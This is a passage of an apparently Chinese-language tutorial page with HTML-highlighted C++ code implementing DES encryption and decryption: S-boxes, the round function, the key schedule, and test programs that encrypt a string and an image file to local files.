class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>&#125;,</span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>&#125;,</span><br><span class="line">&#123;<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>&#125;,</span><br><span class="line">&#123;<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>&#125;,</span><br><span class="line">&#123;<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,</span><br><span class="line">&#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,</span><br><span class="line">&#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,</span><br><span class="line">&#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,</span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,</span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,</span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P置换，32位 -&gt; 32位</span></span><br><span class="line"><span class="type">int</span> P[] = &#123;<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">   <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">   <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">   <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/*                            下面是DES算法实现                         */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  密码函数f，接收32位数据和48位子密钥，产生一个32位的输出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">bitset&lt;32&gt; <span class="title">f</span><span class="params">(bitset&lt;<span class="number">32</span>&gt; R, bitset&lt;<span class="number">48</span>&gt; k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;48&gt; expandR;</span><br><span class="line"><span class="comment">// 第一步：扩展置换，32 -&gt; 48</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">48</span>; ++i)</span><br><span class="line">expandR[<span class="number">47</span>-i] = R[<span class="number">32</span>-E[i]];</span><br><span class="line"><span class="comment">// 第二步：异或</span></span><br><span class="line">expandR = expandR ^ k;</span><br><span class="line"><span class="comment">// 第三步：查找S_BOX置换表</span></span><br><span class="line">bitset&lt;32&gt; output;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">48</span>; i=i+<span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> row = expandR[<span class="number">47</span>-i]*<span class="number">2</span> + expandR[<span class="number">47</span>-i<span class="number">-5</span>];</span><br><span class="line"><span class="type">int</span> col = expandR[<span class="number">47</span>-i<span class="number">-1</span>]*<span class="number">8</span> + expandR[<span class="number">47</span>-i<span class="number">-2</span>]*<span class="number">4</span> + expandR[<span class="number">47</span>-i<span class="number">-3</span>]*<span class="number">2</span> + expandR[<span class="number">47</span>-i<span class="number">-4</span>];</span><br><span class="line"><span class="type">int</span> num = S_BOX[i/<span class="number">6</span>][row][col];</span><br><span class="line"><span class="function">bitset&lt;4&gt; <span class="title">binary</span><span class="params">(num)</span></span>;</span><br><span class="line">output[<span class="number">31</span>-x] = binary[<span class="number">3</span>];</span><br><span class="line">output[<span class="number">31</span>-x<span class="number">-1</span>] = binary[<span class="number">2</span>];</span><br><span class="line">output[<span class="number">31</span>-x<span class="number">-2</span>] = binary[<span class="number">1</span>];</span><br><span class="line">output[<span class="number">31</span>-x<span class="number">-3</span>] = binary[<span class="number">0</span>];</span><br><span class="line">x += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第四步：P-置换，32 -&gt; 32</span></span><br><span class="line">bitset&lt;32&gt; tmp = output;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">output[<span class="number">31</span>-i] = tmp[<span class="number">32</span>-P[i]];</span><br><span class="line"><span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  对56位密钥的前后部分进行左移</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">bitset&lt;28&gt; <span class="title">leftShift</span><span class="params">(bitset&lt;<span class="number">28</span>&gt; k, <span class="type">int</span> shift)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;28&gt; tmp = k;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">27</span>; i&gt;=<span class="number">0</span>; --i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-shift&lt;<span class="number">0</span>)</span><br><span class="line">k[i] = tmp[i-shift+<span class="number">28</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">k[i] = tmp[i-shift];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  生成16个48位的子密钥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">generateKeys</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;56&gt; realKey; <span class="comment">// 密钥key(64) -&gt;  密钥realKey(56) -&gt; 最终每一轮的密钥compressKey(48)</span></span><br><span class="line">bitset&lt;28&gt; left;</span><br><span class="line">bitset&lt;28&gt; right;</span><br><span class="line">bitset&lt;48&gt; compressKey;</span><br><span class="line"><span class="comment">// 去掉奇偶标记位，将64位密钥变成56位</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">56</span>; ++i)</span><br><span class="line">realKey[<span class="number">55</span>-i] = key[<span class="number">64</span> - PC_1[i]];</span><br><span class="line"><span class="comment">// 生成子密钥，保存在 subKeys[16] 中</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> round=<span class="number">0</span>; round&lt;<span class="number">16</span>; ++round)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 前28位与后28位</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">28</span>; i&lt;<span class="number">56</span>; ++i)</span><br><span class="line">left[i<span class="number">-28</span>] = realKey[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">28</span>; ++i)</span><br><span class="line">right[i] = realKey[i];</span><br><span class="line"><span class="comment">// 左移</span></span><br><span class="line">left = <span class="built_in">leftShift</span>(left, shiftBits[round]);</span><br><span class="line">right = <span class="built_in">leftShift</span>(right, shiftBits[round]);</span><br><span class="line"><span class="comment">// 压缩置换，由56位得到48位子密钥</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">28</span>; i&lt;<span class="number">56</span>; ++i)</span><br><span class="line">realKey[i] = left[i<span class="number">-28</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">28</span>; ++i)</span><br><span class="line">realKey[i] = right[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">48</span>; ++i)</span><br><span class="line">compressKey[<span class="number">47</span>-i] = realKey[<span class="number">56</span> - PC_2[i]];</span><br><span class="line">subKey[round] = compressKey;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  工具函数：将char字符数组转为二进制</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">charToBitset</span><span class="params">(<span class="type">const</span> <span class="type">char</span> s[<span class="number">8</span>])</span> <span class="comment">// 比如说明文或者密文都需要转成二进制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;64&gt; bits;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">8</span>; ++j)</span><br><span class="line">bits[i*<span class="number">8</span>+j] = ((s[i]&gt;&gt;j) &amp; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> bits;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  DES加密</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">encrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt;&amp; plain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;64&gt; cipher;</span><br><span class="line">bitset&lt;64&gt; currentBits;</span><br><span class="line">bitset&lt;32&gt; left;</span><br><span class="line">bitset&lt;32&gt; right;</span><br><span class="line">bitset&lt;32&gt; newLeft;</span><br><span class="line"><span class="comment">// 第一步：初始置换IP</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">currentBits[<span class="number">63</span>-i] = plain[<span class="number">64</span>-IP[i]];</span><br><span class="line"><span class="comment">// 第二步：获取 Li 和 Ri</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">32</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">left[i<span class="number">-32</span>] = currentBits[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">right[i] = currentBits[i];</span><br><span class="line"><span class="comment">// 第三步：共16轮迭代</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> round=<span class="number">0</span>; round&lt;<span class="number">16</span>; ++round)</span><br><span class="line">&#123;</span><br><span class="line">newLeft = right;</span><br><span class="line">right = left ^ <span class="built_in">f</span>(right,subKey[round]);</span><br><span class="line">left = newLeft;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第四步：合并L16和R16，注意合并为 R16L16</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">cipher[i] = left[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">32</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">cipher[i] = right[i<span class="number">-32</span>];</span><br><span class="line"><span class="comment">// 第五步：结尾置换IP-1</span></span><br><span class="line">currentBits = cipher;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">cipher[<span class="number">63</span>-i] = currentBits[<span class="number">64</span>-IP_1[i]];</span><br><span class="line"><span class="comment">// 返回密文</span></span><br><span class="line"><span class="keyword">return</span> cipher;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  DES解密</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">bitset&lt;64&gt; <span class="title">decrypt</span><span class="params">(bitset&lt;<span class="number">64</span>&gt;&amp; cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">bitset&lt;64&gt; plain; <span class="comment">// 解密后的明文</span></span><br><span class="line">bitset&lt;64&gt; currentBits;</span><br><span class="line">bitset&lt;32&gt; left;</span><br><span class="line">bitset&lt;32&gt; right;</span><br><span class="line">bitset&lt;32&gt; newLeft;</span><br><span class="line"><span class="comment">// 第一步：初始置换IP</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">currentBits[<span class="number">63</span>-i] = cipher[<span class="number">64</span>-IP[i]];</span><br><span class="line"><span class="comment">// 第二步：获取 Li 和 Ri</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">32</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">left[i<span class="number">-32</span>] = currentBits[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">right[i] = currentBits[i];</span><br><span class="line"><span class="comment">// 第三步：共16轮迭代（子密钥逆序应用）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> round=<span class="number">0</span>; round&lt;<span class="number">16</span>; ++round)</span><br><span class="line">&#123;</span><br><span class="line">newLeft = right;</span><br><span class="line">right = left ^ <span class="built_in">f</span>(right,subKey[<span class="number">15</span>-round]);</span><br><span class="line">left = newLeft;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第四步：合并L16和R16，注意合并为 R16L16</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; ++i)</span><br><span class="line">plain[i] = left[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">32</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">plain[i] = right[i<span class="number">-32</span>];</span><br><span class="line"><span class="comment">// 第五步：结尾置换IP-1</span></span><br><span class="line">currentBits = plain;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">64</span>; ++i)</span><br><span class="line">plain[<span class="number">63</span>-i] = currentBits[<span class="number">64</span>-IP_1[i]];</span><br><span class="line"><span class="comment">// 返回明文</span></span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"><span class="comment">/* 测试：                                                             */</span></span><br><span class="line"><span class="comment">/*     1.将一个 64 位的字符串加密， 把密文写入文件 a.txt                  */</span></span><br><span class="line"><span class="comment">/*     2.读取文件 a.txt 获得 64 位密文，解密之后再写入 b.txt              */</span></span><br><span class="line"><span class="comment">/**********************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">string s = <span class="string">&quot;romantic&quot;</span>;</span><br><span class="line">string k = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">bitset&lt;64&gt; plain = <span class="built_in">charToBitset</span>(s.<span class="built_in">c_str</span>());</span><br><span class="line">key = <span class="built_in">charToBitset</span>(k.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="comment">// 生成16个子密钥</span></span><br><span class="line"><span class="built_in">generateKeys</span>();</span><br><span class="line"><span class="comment">// 密文写入 a.txt</span></span><br><span class="line">bitset&lt;64&gt; cipher = <span class="built_in">encrypt</span>(plain);</span><br><span class="line">fstream file1;</span><br><span class="line">file1.<span class="built_in">open</span>(<span class="string">&quot;D://a.txt&quot;</span>, ios::binary | ios::out);</span><br><span class="line">file1.<span class="built_in">write</span>((<span class="type">char</span>*)&amp;cipher,<span class="built_in">sizeof</span>(cipher));</span><br><span class="line">file1.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读文件 a.txt</span></span><br><span class="line">bitset&lt;64&gt; temp;</span><br><span class="line">file1.<span class="built_in">open</span>(<span class="string">&quot;D://a.txt&quot;</span>, ios::binary | ios::in);</span><br><span class="line">file1.<span class="built_in">read</span>((<span class="type">char</span>*)&amp;temp, <span class="built_in">sizeof</span>(temp));</span><br><span class="line">file1.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密，并写入文件 b.txt</span></span><br><span class="line">bitset&lt;64&gt; temp_plain = <span class="built_in">decrypt</span>(temp);</span><br><span class="line">file1.<span class="built_in">open</span>(<span class="string">&quot;D://b.txt&quot;</span>, ios::binary | ios::out);</span><br><span class="line">file1.<span class="built_in">write</span>((<span class="type">char</span>*)&amp;temp_plain,<span class="built_in">sizeof</span>(temp_plain));</span><br><span class="line">file1.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-解密">2.解密</h3><p>那么，在对 64 位的数据加解密成功以后，对文件的加解密就很简单了！只需要每次读 64 位，加密以后，将 64 位的密文写入另外一个文件……如此循环，直到文件尾。下面是对一张图片进行加密和解密的测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">string k = <span class="string">&quot;12345678&quot;</span>;</span><br><span class="line">key = <span class="built_in">charToBitset</span>(k.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="built_in">generateKeys</span>();   <span class="comment">// 生成16个子密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件 flower.jpg 加密到 cipher.txt 中</span></span><br><span class="line">ifstream in;</span><br><span class="line">ofstream out;</span><br><span class="line">in.<span class="built_in">open</span>(<span class="string">&quot;D://flower.jpg&quot;</span>, ios::binary);</span><br><span class="line">out.<span class="built_in">open</span>(<span class="string">&quot;D://cipher.txt&quot;</span>, ios::binary);</span><br><span class="line">bitset&lt;64&gt; plain;</span><br><span class="line"><span class="keyword">while</span>(in.<span class="built_in">read</span>((<span class="type">char</span>*)&amp;plain, <span class="built_in">sizeof</span>(plain)))</span><br><span class="line">&#123;</span><br><span class="line">bitset&lt;64&gt; cipher  